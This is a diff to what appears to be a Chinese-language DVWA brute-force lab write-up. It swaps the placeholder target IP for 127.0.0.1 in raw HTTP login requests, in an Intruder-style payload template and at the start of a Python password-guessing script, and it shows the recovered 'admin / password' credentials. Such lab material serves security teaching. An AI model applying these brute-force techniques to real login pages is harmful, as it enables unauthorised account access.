@@ -77,7 +77,7 @@ Username and/or password incorrect.
 
 ```http
 GET /dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login HTTP/1.1
-Host: 靶机IP
+Host: 127.0.0.1
 Cookie: PHPSESSID=...; security=low
 User-Agent: Mozilla/5.0 ...
 Accept: text/html,...
@@ -96,7 +96,7 @@ Connection: close
 
 ```http
 GET /dvwa/vulnerabilities/brute/?username=§admin§&password=§123456§&Login=Login HTTP/1.1
-Host: 靶机IP
+Host: 127.0.0.1
 Cookie: PHPSESSID=...; security=low
 ...
 ```
@@ -183,7 +183,7 @@ admin / password
 ```python
 import requests
 
-TARGET = "http://靶机IP/dvwa/vulnerabilities/brute/"
+TARGET = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
 COOKIES = {
     "PHPSESSID": "你的会话ID",
     "security": "low"
